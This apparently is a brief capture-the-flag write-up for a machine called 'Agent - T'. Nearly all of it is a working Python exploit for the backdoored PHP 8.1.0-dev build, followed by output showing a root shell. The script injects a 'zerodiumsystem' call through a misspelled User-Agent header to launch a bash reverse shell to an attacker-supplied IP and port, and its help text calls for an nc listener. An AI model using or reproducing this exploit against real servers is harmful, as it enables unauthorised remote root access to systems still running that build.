# Agent - T

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/bb1f8684-b48d-408a-83de-24e13456ea15)


#### PHP/8.1.0-dev RCE vulnerable

```
#!/usr/bin/env python3
import os, sys, argparse, requests

request = requests.Session()

def check_target(args):
    response = request.get(args.url)
    for header in response.headers.items():
        if "PHP/8.1.0-dev" in header[1]:
            return True
    return False

def reverse_shell(args):
    payload = 'bash -c \"bash -i >& /dev/tcp/' + args.lhost + '/' + args.lport + ' 0>&1\"'
    injection = request.get(args.url, headers={"User-Agentt": "zerodiumsystem('" + payload + "');"}, allow_redirects = False)

def main(): 
    parser = argparse.ArgumentParser(description="Get a reverse shell from PHP 8.1.0-dev backdoor. Set up a netcat listener in another shell: nc -nlvp <attacker PORT>")
    parser.add_argument("url", metavar='<target URL>', help="Target URL")
    parser.add_argument("lhost", metavar='<attacker IP>', help="Attacker listening IP",)
    parser.add_argument("lport", metavar='<attacker PORT>', help="Attacker listening port")
    args = parser.parse_args()
    if check_target(args):
        reverse_shell(args)
    else:
        print("Host is not available or vulnerable, aborting...")
        exit
    
if __name__ == "__main__":
    main()
```
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/2b86db8e-928e-44d6-9fde-848f0c677c89)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/fbd1904a-6e0d-44c4-ba76-daf1f30abb99)

` root@3f8655e43931:/var/www/html# whoami
whoami
root
`




